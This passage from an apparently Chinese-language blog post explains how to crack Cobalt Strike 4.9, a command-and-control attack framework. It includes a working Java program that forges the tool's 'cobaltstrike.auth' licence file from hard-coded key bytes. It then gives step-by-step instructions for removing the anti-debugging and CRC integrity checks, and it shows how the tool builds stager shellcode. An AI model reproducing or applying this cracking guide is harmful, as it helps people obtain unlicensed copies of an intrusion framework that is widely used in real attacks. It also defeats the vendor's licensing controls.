class="code"><pre><code class="hljs subunit">import javax.crypto.BadPaddingException;<br>import javax.crypto.Cipher;<br>import javax.crypto.IllegalBlockSizeException;<br>import javax.crypto.NoSuchPaddingException;<br>import java.io.*;<br>import java.nio.file.Files;<br>import java.nio.file.Path;<br>import java.security.*;<br>import java.security.spec.InvalidKeySpecException;<br>import java.security.spec.PKCS8EncodedKeySpec;<br>import java.security.spec.X509EncodedKeySpec;<br><br>public class RSAKeyPairGenerator &#123;<br>    private PrivateKey privateKey;<br>    private PublicKey publicKey;<br>    public boolean chunk;<br><br>    public RSAKeyPairGenerator() throws NoSuchAlgorithmException &#123;<br>        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(&quot;RSA&quot;);<br>        keyGen.initialize(4096);<br>        KeyPair pair = keyGen.generateKeyPair();<br>        this.privateKey = pair.getPrivate();<br>        this.publicKey = pair.getPublic();<br>    &#125;<br><br>    public RSAKeyPairGenerator(String publicKeyPath, String privateKeyPath)<br>            throws NoSuchAlgorithmException, InvalidKeySpecException &#123;<br><br>        byte[] publicKeyByte = byteFromFile(publicKeyPath);<br>        byte[] privateKeyByte = byteFromFile(privateKeyPath);<br>        KeyFactory keyFactory = KeyFactory.getInstance(&quot;RSA&quot;);<br>        X509EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyByte);<br>        PKCS8EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyByte);<br>        this.publicKey = keyFactory.generatePublic(publicKeySpec);<br>        this.privateKey = keyFactory.generatePrivate(privateKeySpec);<br><br>    &#125;<br><br>    // 将byte 写入文件<br>    public void byte2File(String path, byte[] data) throws IOException &#123;<br>        File f = new File(path);<br>        f.getParentFile().mkdirs();<br><br>        FileOutputStream fos = new FileOutputStream(f);<br>        fos.write(data);<br>        fos.flush();<br>        fos.close();<br>    &#125;<br><br>    // 从文件种读取bye<br>    public byte[] byteFromFile(String path) &#123;<br><br>        Path filePath = Path.of(path);<br><br>        try &#123;<br>            byte[] data = Files.readAllBytes(filePath);<br>            return data;<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        return new byte[1];<br><br>    &#125;<br><br>    public PrivateKey getPrivateKey() &#123;<br>        return privateKey;<br>    &#125;<br><br>    public PublicKey getPublicKey() &#123;<br>        return publicKey;<br>    &#125;<br><br>    public static byte[] subByte(byte[] original, int from, int to) &#123;<br>        int newLength = to - from;<br>        if (newLength &lt; 0)<br>            throw new IllegalArgumentException(from + &quot; &gt; &quot; + to);<br>        byte[] copy = new byte[newLength];<br>        System.arraycopy(original, from, copy, 0,<br>                Math.min(original.length - from, newLength));<br>        return copy;<br>    &#125;<br><br>    public static byte[] mergerByte(byte[] original1, byte[] original2) &#123;<br>        byte[] copy = new byte[original1.length + original2.length];<br>        System.arraycopy(original1, 0, copy, 0, original1.length);<br>        System.arraycopy(original2, 0, copy, original1.length, original2.length);<br>        return copy;<br>    &#125;<br><br>    // 加密数据<br>    public byte[] encryptPri(byte[] data, PrivateKey privateKey) throws BadPaddingException, IllegalBlockSizeException,<br>            InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, IOException &#123;<br>        Cipher cipher = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;);<br>        cipher.init(Cipher.ENCRYPT_MODE, this.privateKey);<br>        if (!this.chunk)<br>            return cipher.doFinal(data);<br>        int inputLen = data.length;<br>        int offLen = 0;<br>        ByteArrayOutputStream bops = new ByteArrayOutputStream();<br>        int i = 0;<br>        while (inputLen - offLen &gt; 0) &#123;<br>            byte[] cache;<br>            if (inputLen - offLen &gt; 245) &#123;<br>                cache = cipher.doFinal(data, offLen, 245);<br>            &#125; else &#123;<br>                cache = cipher.doFinal(data, offLen, inputLen - offLen);<br>            &#125;<br>            bops.write(cache);<br>            i++;<br>            offLen = 245 * i;<br>        &#125;<br><br>        return bops.toByteArray();<br>    &#125;<br><br>    // 解密数据<br>    public byte[] decryptPub(byte[] data, PublicKey publicKey) throws BadPaddingException, IllegalBlockSizeException,<br>            InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, IOException,<br>            InvalidKeySpecException &#123;<br><br>        Cipher cipher = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;);<br>        cipher.init(2, this.publicKey);<br>        return cipher.doFinal(data);<br>    &#125;<br><br>    public static void main(String[] args) throws NoSuchAlgorithmException, IOException, IllegalBlockSizeException,<br>            InvalidKeyException, NoSuchPaddingException, BadPaddingException, InvalidKeySpecException &#123;<br>        File file = new File(&quot;RSA/authkey.private&quot;);<br>        RSAKeyPairGenerator PairGenerator;<br>        if (file.exists())<br>            PairGenerator = new RSAKeyPairGenerator(&quot;RSA/authkey.pub&quot;, &quot;RSA/authkey.private&quot;);<br>        else &#123;<br>            PairGenerator = new RSAKeyPairGenerator();<br>            PairGenerator.byte2File(&quot;RSA/authkey.private&quot;,<br>                    PairGenerator.getPrivateKey().getEncoded());<br>            PairGenerator.byte2File(&quot;RSA/authkey.pub&quot;,<br>                    PairGenerator.getPublicKey().getEncoded());<br>        &#125;<br>        // byte[] data = &#123;<span class="hljs-string">-54</span>, <span class="hljs-string">-2</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-45</span>, 0, 77, 1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>, 127, 0, 0, 0, 1, 43,<br>        // 16, 58, 68, 37, 73, 15, 56, <span class="hljs-string">-102</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-61</span>, 18, <span class="hljs-string">-67</span>, <span class="hljs-string">-41</span>, 88, <span class="hljs-string">-83</span>, 43, <span class="hljs-string">-103</span><br>        // &#125;;<br>        // byte[] data =&#123;<br>        // <span class="hljs-string">-54</span>, <span class="hljs-string">-2</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-45</span>,<br>        // 0, 77, 1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>,<br>        // 127,<br>        // 0, 0, 0, 1,<br>        // 43,<br>        // 16, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20,<br>        // 16, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20,<br>        // 16, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20, 20,<br>        // 16, 58, 68, 37, 73, 15, 56, <span class="hljs-string">-102</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-61</span>, 18, <span class="hljs-string">-67</span>, <span class="hljs-string">-41</span>, 88, <span class="hljs-string">-83</span>, 43, <span class="hljs-string">-103</span><br>        // &#125;; // 4.3<br>        // byte[] data=&#123;<br>        // <span class="hljs-string">-54</span>, <span class="hljs-string">-2</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-45</span>,<br>        // 0, <span class="hljs-string">-54</span>,<br>        // 1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>, 127,<br>        // 23, 80, 101, <span class="hljs-string">-22</span>,<br>        // 47,<br>        // 16, 27, <span class="hljs-string">-27</span>, <span class="hljs-string">-66</span>, 82, <span class="hljs-string">-58</span>, 37, 92, 51, 85, <span class="hljs-string">-114</span>, <span class="hljs-string">-118</span>, 28, <span class="hljs-string">-74</span>, 103, <span class="hljs-string">-53</span>, 6,<br>        // 16, <span class="hljs-string">-128</span>, <span class="hljs-string">-29</span>, 42, 116, 32, 96, <span class="hljs-string">-72</span>, <span class="hljs-string">-124</span>, 65, <span class="hljs-string">-101</span>, <span class="hljs-string">-96</span>, <span class="hljs-string">-63</span>, 113, <span class="hljs-string">-55</span>, <span class="hljs-string">-86</span>,<br>        // 118,<br>        // 16, <span class="hljs-string">-78</span>, 13, 72, 122, <span class="hljs-string">-35</span>, <span class="hljs-string">-44</span>, 113, 52, 24, <span class="hljs-string">-14</span>, <span class="hljs-string">-43</span>, <span class="hljs-string">-93</span>, <span class="hljs-string">-82</span>, 2, <span class="hljs-string">-89</span>, <span class="hljs-string">-96</span>,<br>        // 16, 58, 68, 37, 73, 15, 56, <span class="hljs-string">-102</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-61</span>, 18, <span class="hljs-string">-67</span>, <span class="hljs-string">-41</span>, 88, <span class="hljs-string">-83</span>, 43, <span class="hljs-string">-103</span>,<br>        // 16, 94, <span class="hljs-string">-104</span>, 25, 74, 1, <span class="hljs-string">-58</span>, <span class="hljs-string">-76</span>, <span class="hljs-string">-113</span>, <span class="hljs-string">-91</span>, <span class="hljs-string">-126</span>, <span class="hljs-string">-90</span>, <span class="hljs-string">-87</span>, <span class="hljs-string">-4</span>, <span class="hljs-string">-69</span>, <span class="hljs-string">-110</span>,<br>        // <span class="hljs-string">-42</span>,<br>        // 16, <span class="hljs-string">-13</span>, <span class="hljs-string">-114</span>, <span class="hljs-string">-77</span>, <span class="hljs-string">-47</span>, <span class="hljs-string">-93</span>, 53, <span class="hljs-string">-78</span>, 82, <span class="hljs-string">-75</span>, <span class="hljs-string">-117</span>, <span class="hljs-string">-62</span>, <span class="hljs-string">-84</span>, <span class="hljs-string">-34</span>, <span class="hljs-string">-127</span>,<br>        // <span class="hljs-string">-75</span>, 66,<br>        // 0, 0, 0, 24,<br>        // 105, 100, 118, 121, 85, 97, 77, 68, 75, 117, 98, 87, 87, 52, 84, 76, 51, 105,<br>        // 80, 106, 66, 119, 61, 61,<br>        // 16, <span class="hljs-string">-71</span>, <span class="hljs-string">-86</span>, 51, 8, 10, 90, <span class="hljs-string">-112</span>, 49, 62, <span class="hljs-string">-15</span>, <span class="hljs-string">-99</span>, <span class="hljs-string">-64</span>, 98, 125, 46, <span class="hljs-string">-95</span>,<br>        // 28, 115, 53, 57, 108, 53, 105, 113, 49, 101, 106, 90, 51, 79, 81, 100, 47,<br>        // 115, 103, 118, 78, 97, 103, 61, 61, 113, <span class="hljs-string">-112</span>, <span class="hljs-string">-42</span>, 104,<br>        // 16, <span class="hljs-string">-122</span>, 56, <span class="hljs-string">-75</span>, 17, <span class="hljs-string">-32</span>, 91, 85, 123, <span class="hljs-string">-7</span>, 112, <span class="hljs-string">-60</span>, 24, 53, 109, 68, <span class="hljs-string">-12</span><br>        // &#125;; // 4.7<br><br>        byte[] data = &#123;<br>                <span class="hljs-string">-54</span>, <span class="hljs-string">-2</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-45</span>,<br>                0, <span class="hljs-string">-11</span>,<br>                16, <span class="hljs-string">-1</span>, 12, <span class="hljs-string">-6</span>, 65, 7, <span class="hljs-string">-47</span>, 91, 48, 17, 61, 29, 43, <span class="hljs-string">-99</span>, <span class="hljs-string">-23</span>, 21, 109,<br>                34, <span class="hljs-string">-96</span>, 55, 34, <span class="hljs-string">-9</span>, 88, 123, <span class="hljs-string">-79</span>, 80, 106, <span class="hljs-string">-125</span>, <span class="hljs-string">-118</span>, 85, <span class="hljs-string">-85</span>, 2, <span class="hljs-string">-46</span>, 23, 65, 48, 102, <span class="hljs-string">-102</span>, <span class="hljs-string">-20</span>, <span class="hljs-string">-2</span>,<br>                <span class="hljs-string">-79</span>, <span class="hljs-string">-124</span>, <span class="hljs-string">-24</span>, <span class="hljs-string">-67</span>, <span class="hljs-string">-116</span>, 50, <span class="hljs-string">-96</span>, 4, 19, <span class="hljs-string">-57</span>, <span class="hljs-string">-125</span>, 76,<br>                49,<br>                1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>, 127,<br>                58, <span class="hljs-string">-34</span>, 104, <span class="hljs-string">-79</span>,<br>                0, 0, 0, 24,<br>                78, 116, 90, 79, 86, 54, 74, 122, 68, 114, 57, 81, 107, 69, 110, 88, 54, 98, 111, 98, 80, 103, 61, 61,<br>                28, 115, 53, 57, 108, 53, 105, 113, 49, 101, 106, 90, 51, 79, 81, 100, 47, 115, 103, 118, 78, 97, 103,<br>                61, 61, 113, <span class="hljs-string">-112</span>, <span class="hljs-string">-42</span>, 104,<br>                <span class="hljs-string">-6</span>, <span class="hljs-string">-89</span>, 53, <span class="hljs-string">-104</span>, <span class="hljs-string">-110</span>, 84, <span class="hljs-string">-33</span>, 40, <span class="hljs-string">-58</span>, <span class="hljs-string">-6</span>, 77, 38, <span class="hljs-string">-11</span>, <span class="hljs-string">-106</span>, <span class="hljs-string">-63</span>, 78, <span class="hljs-string">-60</span>, 85, 78, 104, 120, 7,<br>                <span class="hljs-string">-94</span>, 68, 45, <span class="hljs-string">-23</span>, <span class="hljs-string">-118</span>, 111, 91, 26, <span class="hljs-string">-125</span>, <span class="hljs-string">-52</span>, 113, <span class="hljs-string">-113</span>, 57, 90, 63, <span class="hljs-string">-124</span>, <span class="hljs-string">-88</span>, 71, <span class="hljs-string">-81</span>, 22, <span class="hljs-string">-4</span>, 6,<br>                <span class="hljs-string">-37</span>, <span class="hljs-string">-32</span>, <span class="hljs-string">-61</span>, 96, 27, <span class="hljs-string">-20</span>, <span class="hljs-string">-120</span>, 111, 70, 106, 16, 59, 88, <span class="hljs-string">-47</span>, <span class="hljs-string">-13</span>, <span class="hljs-string">-118</span>, 37, <span class="hljs-string">-48</span>, <span class="hljs-string">-103</span>, <span class="hljs-string">-128</span>, <span class="hljs-string">-47</span>, 6,<br>                25, <span class="hljs-string">-123</span>, 8, <span class="hljs-string">-126</span>, 10, <span class="hljs-string">-12</span>, 112, <span class="hljs-string">-84</span>, <span class="hljs-string">-97</span>, 126, <span class="hljs-string">-62</span>, 90, 105, <span class="hljs-string">-64</span>, <span class="hljs-string">-119</span>, <span class="hljs-string">-10</span>, 68, <span class="hljs-string">-128</span>, <span class="hljs-string">-121</span>, 95, 82,<br>                <span class="hljs-string">-110</span>, <span class="hljs-string">-25</span>, <span class="hljs-string">-31</span>, 40, <span class="hljs-string">-27</span>, 59, <span class="hljs-string">-89</span>, 71, <span class="hljs-string">-60</span>, 127, 91, <span class="hljs-string">-51</span>, <span class="hljs-string">-8</span>, 63, 9, 35, <span class="hljs-string">-55</span>, 60, 124, 49, <span class="hljs-string">-6</span>, <span class="hljs-string">-123</span>, <span class="hljs-string">-92</span>,<br>                79, <span class="hljs-string">-21</span>, 37, <span class="hljs-string">-13</span>, <span class="hljs-string">-23</span>, 76, <span class="hljs-string">-42</span>, 74, <span class="hljs-string">-111</span>, <span class="hljs-string">-4</span>, <span class="hljs-string">-24</span>,<br>                // 4, 5, 33, 0, <span class="hljs-string">-35</span>, <span class="hljs-string">-94</span>, <span class="hljs-string">-25</span>, <span class="hljs-string">-37</span>, 60, <span class="hljs-string">-88</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-15</span>,<br>                // 64, 74, <span class="hljs-string">-11</span>, <span class="hljs-string">-84</span>, <span class="hljs-string">-86</span>, <br><br>                // 120, 39, <span class="hljs-string">-110</span>, 119, // TeamServerImage header<br>                // 0, <span class="hljs-string">-56</span>,<br>                50, 66, 104, <span class="hljs-string">-29</span>, 106, 19, <span class="hljs-string">-15</span>, 10, <span class="hljs-string">-88</span>, <span class="hljs-string">-38</span>, 50, <span class="hljs-string">-113</span>, 50, <span class="hljs-string">-124</span>, <span class="hljs-string">-108</span>, 127, 107, <span class="hljs-string">-35</span>, 105, 20, <span class="hljs-string">-47</span>, 48, 68, 91, 86, 69, <span class="hljs-string">-110</span>, 6, 16, <span class="hljs-string">-97</span>, <span class="hljs-string">-124</span>, 113, <span class="hljs-string">-103</span>, <span class="hljs-string">-48</span>, <span class="hljs-string">-73</span>, 124, <span class="hljs-string">-6</span>, <span class="hljs-string">-21</span>, <span class="hljs-string">-24</span>, 66, 11, <span class="hljs-string">-104</span>, 51, 35, 59, <span class="hljs-string">-45</span>, 52, <span class="hljs-string">-122</span>, 7, 50, 80,<br><br>                1, <span class="hljs-string">-55</span>, <span class="hljs-string">-61</span>, 127,<br>                58, <span class="hljs-string">-34</span>, 104, <span class="hljs-string">-79</span>,<br>                49,<br>                0, 0, 0, 24,<br>                78, 116, 90, 79, 86, 54, 74, 122, 68, 114, 57, 81, 107, 69, 110, 88, 54, 98, 111, 98, 80, 103, 61, 61,<br>                28, 115, 53, 57, 108, 53, 105, 113, 49, 101, 106, 90, 51, 79, 81, 100, 47, 115, 103, 118, 78, 97, 103,<br>                61, 61,<br>                113, <span class="hljs-string">-112</span>, <span class="hljs-string">-42</span>, 104,<br>                16, <span class="hljs-string">-1</span>, 12, <span class="hljs-string">-6</span>, 65, 7, <span class="hljs-string">-47</span>, 91, 48, 17, 61, 29, 43, <span class="hljs-string">-99</span>, <span class="hljs-string">-23</span>, 21, 109,<br>                34, 65, <span class="hljs-string">-7</span>, <span class="hljs-string">-74</span>, 111, 41, <span class="hljs-string">-12</span>, 41, <span class="hljs-string">-53</span>, <span class="hljs-string">-85</span>, <span class="hljs-string">-120</span>, <span class="hljs-string">-19</span>, <span class="hljs-string">-60</span>, 107, <span class="hljs-string">-108</span>, 65, 65, 25, <span class="hljs-string">-84</span>, 73, 56, <span class="hljs-string">-126</span>, <span class="hljs-string">-18</span>, <span class="hljs-string">-37</span>, <span class="hljs-string">-113</span>, 38, 19, 115, <span class="hljs-string">-24</span>, <span class="hljs-string">-90</span>, <span class="hljs-string">-105</span>, <span class="hljs-string">-30</span>, 127, <span class="hljs-string">-17</span>, <span class="hljs-string">-105</span>, 87, <span class="hljs-string">-94</span>, <span class="hljs-string">-102</span>, 37, 22, <span class="hljs-string">-26</span>, 34, <br>                <br>                <br>                84, 7, 46, <span class="hljs-string">-84</span>, <span class="hljs-string">-88</span>, <span class="hljs-string">-75</span>, <span class="hljs-string">-10</span>, 30, 75, <span class="hljs-string">-45</span>, 69, <span class="hljs-string">-31</span>, 70, <span class="hljs-string">-104</span>, <span class="hljs-string">-53</span>, 91,<br>                1, <span class="hljs-string">-67</span>, <span class="hljs-string">-87</span>, 4, 6, <span class="hljs-string">-33</span>, <span class="hljs-string">-64</span>, <span class="hljs-string">-115</span>, 50, 79, <span class="hljs-string">-13</span>, 39, <span class="hljs-string">-85</span>, 44, 27, <span class="hljs-string">-33</span>, <span class="hljs-string">-54</span>, <span class="hljs-string">-112</span>, <span class="hljs-string">-21</span>, <span class="hljs-string">-56</span>, <span class="hljs-string">-84</span>, 77, <span class="hljs-string">-46</span>,<br>                <span class="hljs-string">-58</span>, <span class="hljs-string">-62</span>, <span class="hljs-string">-107</span>, 50, <span class="hljs-string">-55</span>, 56, <span class="hljs-string">-53</span>, 35, <span class="hljs-string">-56</span>, 96, 95, 86, 117, <span class="hljs-string">-107</span>, <span class="hljs-string">-103</span>, <span class="hljs-string">-1</span>, <span class="hljs-string">-89</span>, <span class="hljs-string">-58</span>, <span class="hljs-string">-92</span>, <span class="hljs-string">-63</span>, <span class="hljs-string">-6</span>, 20,<br>                91, 120, <span class="hljs-string">-26</span>, 25, 54, 17, <span class="hljs-string">-107</span>, 99, <span class="hljs-string">-4</span>, <span class="hljs-string">-109</span>, <span class="hljs-string">-39</span>, <span class="hljs-string">-89</span>, 125, <span class="hljs-string">-105</span>, <span class="hljs-string">-14</span>, <span class="hljs-string">-99</span>, <span class="hljs-string">-73</span>, <span class="hljs-string">-15</span>, 59,<br>        &#125;; // 4.9<br><br>        PairGenerator.chunk = true;<br>        System.out.println(data.length);<br>        byte[] rsaByte = PairGenerator.encryptPri(subByte(data,0,245), PairGenerator.getPrivateKey());<br>        System.out.println(rsaByte.length);<br>        PairGenerator.byte2File(&quot;RSA/cobaltstrike.auth&quot;, mergerByte(rsaByte,subByte(data, 245, 245<span class="hljs-string">+256</span>)));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://github.com/atomxw/cobaltstrike4.5_cdf">https://github.com/atomxw/cobaltstrike4.5_cdf</a></p><h2 id="去除反调试"><a href="#去除反调试" class="headerlink" title="去除反调试"></a>去除反调试</h2><p>​cs的反调试代码主要就是遍历运行参数，查看是否包含<code>-javaagent:</code>，因此直接注释掉此处代码即可，可以直接全局文件内容搜索<code>-javaagent:</code>，以下为所有包含反调试代码的函数。</p><ul><li><code>aggressor.Aggressor.A(String[])</code></li><li><code>aggressor.dialogs.ConnectDialog.A()</code></li><li><code>aggressor.dialogs.ExportReportDialog.dialogAction</code></li><li><code>aggressor.dialogs.GoldenTicketDialog.B</code></li><li><code>aggressor.dialogs.PayloadGeneratorDialog.E</code></li><li><code>aggressor.dialogs.ScListenerDialog.C()</code></li><li><code>aggressor.windows.CortanaConsole.CortanaConsole</code></li><li><code>aggressor.windows.ScriptManager.actionPerformed</code></li><li><code>aggressor.windows.SOCKSBroser.actionPerformed</code></li><li><code>commom.BaseArtifactUtils.A</code></li></ul><h2 id="去除文件完整性验证"><a href="#去除文件完整性验证" class="headerlink" title="去除文件完整性验证"></a>去除文件完整性验证</h2><p><strong>第一次验证</strong></p><p>​Aggressor首先<code>checkui</code>校验完整性，主要是对几个加密函数的完整性校验；<code>checkLicenseGUI</code>用于检测认证文件的可用性，包括证书是否合法、是否过期等。</p><p><img src="https://img-blog.csdnimg.cn/direct/20f2654a7eb54883ad6bd2121166d99e.png" alt="image-20230925155240513"></p><p><code>checkui</code>关键函数为<code>commom.Starter.initializeStarter</code>函数校验完整性，。</p><p><img src="https://img-blog.csdnimg.cn/direct/4e9ee1f5215c40508cebb47d5c5a4a8d.png" alt="image-20230925155440119"></p><p>在<code>A</code>函数中，Var5为crc校验码，var4为校验class，其实现主要是在<code>Initializer.isOK(var1, var3, var4, var5, true)</code>。</p><p><img src="https://img-blog.csdnimg.cn/direct/512b4089f6b247acbd37768a994efc7a.png" alt="image-20230925155703184"></p><p><code>Initializer.isFileOK(var1, var4, var5, true)</code>函数中通过获取zipfile（jar包通过zip格式压缩）也就是本jar包内的文件获取crc并比较最开始的crc来确保文件未更改。所有校验的文件包括：</p><ul><li><code>common/AuthCrypto.class</code></li><li><code>resources/authkey.pub</code></li><li><code>common/License.class</code></li><li><code>common/Authorization.class</code></li><li><code>common/SleevedResource.class</code></li><li><code>common/AggressorInfo.class</code></li><li><code>dns/SleeveSecurity.class</code></li><li><code>common/BaseArtifactUtils.class</code></li><li><code>common/BaseResourceUtils.class</code></li><li><code>aggressor/dialogs/PayloadGeneratorDialog.class</code></li></ul><p>​如果对上述文件有所修改的话，请同时修改<code>initializeStarter</code>函数中的crc验证码，或者直接<code>initializeStarter</code>函数返回值设为true，一劳永逸。</p><p><strong>第二次验证</strong></p><p>​第二次完整性验证位于<code>aggressor.ui.UseLookAndFeel.A(Class var0)</code>，这里是base64解码字符串，字符串为校验的文件名，再用crc校验进行文件的二次校验，使用反射动态调用函数<code>common.CommonUtils.validClassIntegrity()</code>，此处验证文件包括：</p><ul><li><code>common.CommonUtils</code></li><li><code>common.Authorization</code></li><li><code>common.AuthCrypto</code></li><li><code>common.DataParser</code></li><li><code>common.SleevedResource</code></li><li><code>dns.SleeveSecurity</code></li><li><code>aggressor.Aggressor</code></li><li><code>common.AggressorInfo</code></li><li><code>common.Starter</code></li></ul><p><img src="https://img-blog.csdnimg.cn/direct/5fffa0d83154442b985bf6dec1f937e5.png" alt="image-20230925162610451"></p><p>同样的，可以直接暴力注释掉。</p><p><strong>第三次验证</strong></p><p>第三次完整性验证位于<code>aggressor.Aggressor</code>，此处验证与第一次验证函数调用相同，都是调用<code>commom.Starter.initializeStarter</code>，因此无需其他修改。</p><p><img src="https://img-blog.csdnimg.cn/direct/7310a58f963742eaa3ef060a02ca4802.png" alt="image-20230925162839842"></p><p><strong>第四次验证</strong></p><p>在<code>ConnectDialog</code>处，还存在第四处完整性校验，<code>ConnectDialog</code>初始化时调用<code>initialize</code>进行校验。</p><p><img src="https://img-blog.csdnimg.cn/direct/6947b419be274e609d2fc65c34b9b722.png" alt="image-20230925161514874"></p><p><img src="https://img-blog.csdnimg.cn/direct/f3129d96b1a54cf1bcea5e199381936e.png" alt="image-20230925161609042"></p><p>此处校验代码位于<code>commom.Starter2.A(Class var1)</code>，与第一次校验类似，同样是验证crc码，唯一不同是crc码位于<code>commom.Starter2.A(Object var1)</code>，此处验证文件包括：</p><ul><li><code>common/Starter.class</code></li><li><code>common/Initializer.class</code></li><li><code>aggressor/Aggressor.class</code></li><li><code>common/AggressorInfo.class</code></li></ul><p><img src="https://img-blog.csdnimg.cn/direct/9dbc77ded89e4b41936944bfe9235ab2.png" alt="image-20230925161955593"></p><h3 id="完整性验证文件列表"><a href="#完整性验证文件列表" class="headerlink" title="完整性验证文件列表"></a>完整性验证文件列表</h3><p>实际上类似的验证非常多，因此我们可以在整个项目中搜索<code>system.exit(1)</code>，查看与之相关的验证，以下罗列了部分验证位置：</p><ul><li><code>conslole.StatusBar.A(Class var0)</code></li><li><code>aggressor.Prefs.A(Class var0)</code></li><li><code>common.Helper.startHelper</code></li></ul><h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.52pojie.cn/thread-1702583-1-1.html">https://www.52pojie.cn/thread-1702583-1-1.html</a></p><h2 id="CobaltStrike-生成ShellCode"><a href="#CobaltStrike-生成ShellCode" class="headerlink" title="CobaltStrike 生成ShellCode"></a>CobaltStrike 生成ShellCode</h2><p>​CS是使用Swing进行UI开发的，我们可以直接在<code>aggressor\dialogs</code>文件夹中直接找对话框对应操作类，例如<code>aggressor\dialogs\WindowsExecutableDialog.java</code>就是<code>Windows stage payload</code>的操作类。</p><p><code>dialogAction()</code>即为点击生成按钮后的触发函数，可以看到<code>dialogAction()</code>获取到架构，通过<code>ListenerUtils.getListener</code>获取监听器，之后通过<code>getPayloadStager()</code>获取payload，最后通过<code>sanveFile()</code>保存文件。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">protected</span> byte[] stager;<br><br><span class="hljs-keyword">public</span> WindowsExecutableDialog(AggressorClient var1) &#123;<br>   <span class="hljs-keyword">this</span>.client = var1;<br>&#125;<br><br><span class="hljs-keyword">public</span> void dialogAction(ActionEvent var1, Map var2) &#123;<br>   <span class="hljs-keyword">this</span>.options = var2;<br>   boolean var3 = DialogUtils.bool(var2, <span class="hljs-string">&quot;x64&quot;</span>);<br>   String var4 = DialogUtils.string(var2, <span class="hljs-string">&quot;listener&quot;</span>);<br>   ScListener var5 = ListenerUtils.getListener(<span class="hljs-keyword">this</span>.client, var4);<br>   <span class="hljs-keyword">if</span> (var5 == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">this</span>.dialog.setVisible(<span class="hljs-literal">true</span>);<br>      DialogUtils.showError(<span class="hljs-string">&quot;A listener was not selected&quot;</span>);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">this</span>.stager = var5.getPayloadStager(var3 ? <span class="hljs-string">&quot;x64&quot;</span> : <span class="hljs-string">&quot;x86&quot;</span>);<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.stager.length == <span class="hljs-number">0</span>) &#123;<br>         <span class="hljs-keyword">this</span>.dialog.setVisible(<span class="hljs-literal">true</span>);<br>         DialogUtils.showError(<span class="hljs-string">&quot;No &quot;</span> + (var3 ? <span class="hljs-string">&quot;x64&quot;</span> : <span class="hljs-string">&quot;x86&quot;</span>) + <span class="hljs-string">&quot; stager for &quot;</span> + var4);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         String var6 = var2.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;output&quot;</span>) + <span class="hljs-string">&quot;&quot;</span>;<br>         String var7 = <span class="hljs-string">&quot;&quot;</span>;<br>         <span class="hljs-keyword">if</span> (var6.indexOf(<span class="hljs-string">&quot;EXE&quot;</span>) &gt; -<span class="hljs-number">1</span>) &#123;<br>            var7 = <span class="hljs-string">&quot;artifact.exe&quot;</span>;<br>         &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var6.indexOf(<span class="hljs-string">&quot;DLL&quot;</span>) &gt; -<span class="hljs-number">1</span>) &#123;<br>            var7 = <span class="hljs-string">&quot;artifact.dll&quot;</span>;<br>         &#125;<br><br>         SafeDialogs.saveFile((JFrame)<span class="hljs-literal">null</span>, var7, <span class="hljs-keyword">this</span>);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getPayloadStager()</code>方法调用<code>aggressor\DataUtils.shellcode()</code>，最终在<code>stagers\Stagers.shellcode()</code>根据监听器类型动态生成<code>Stager</code>类，例如Beacon http监听器的<code>Stager</code>类为<code>BeaconHTTPStagerX64</code>，其继承自相应的<code>GenericHTTPStager</code>，并由<code>generate() </code>生成shellcode。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> byte[] getPayloadStager(String var1) &#123;<br>   <span class="hljs-keyword">return</span> Stagers.shellcode(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">this</span>.getPayload(), 